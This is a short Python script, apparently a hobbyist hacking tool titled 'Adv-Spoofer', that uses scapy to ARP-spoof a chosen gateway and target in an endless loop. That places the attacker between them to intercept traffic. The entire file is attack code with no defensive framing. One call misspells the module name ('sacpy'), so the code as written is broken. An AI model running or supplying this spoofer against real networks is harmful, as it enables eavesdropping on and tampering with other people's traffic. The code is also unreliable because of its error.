#!/usr/bin/python

import scapy.all as scapy


#colours
red = "\033[91;1m"
green = "\033[92;1m"
yellow = "\033[93;1m"
blue = "\033[94;1m"


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac =answer[0][1].hwsrc
    return(mac)



def spoof_arp(target_ip,spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    sacpy.send(packet, verbose=False)










getway = input("[*] Enter The Getway To Spoof: ")
targetip = input("[*] Enter The TargetIp To Spoof: ")

def main():
    
    print(blue + "              _              _____                    __           ")
    print(blue + "     /\      | |            / ____|                  / _|          ")
    print(blue + "    /  \   __| |_   _______| (___  _ __   ___   ___ | |_ ___ _ __  ") 
    print(blue + "   / /\ \ / _` \ \ / /______\___ \| '_ \ / _ \ / _ \|  _/ _ \ '__| ")
    print(blue + "  / ____ \ (_| |\ V /       ____) | |_) | (_) | (_) | ||  __/ |    ")
    print(blue + " /_/    \_\__,_| \_/       |_____/| .__/ \___/ \___/|_| \___|_|    ")
    print(blue + "                                  | |                              ")
    print(blue + "                                  |_|                        " + yellow + "V 1.0")
    print(red  + "<<══════════════════════════════════════════════════════════════>>")
    print(green + "<<════════════════════>> Made By HACKERDJ <<════════════════════>>")
    print(red +  "<<══════════════════════════════════════════════════════════════>>")

    
    
    
    
    try:
        while True:
            spoof_arp(getway,targetip)
            spoof_arp(targetip,getway)
    except KeyboardInterrupt:
        exit(0)

main()
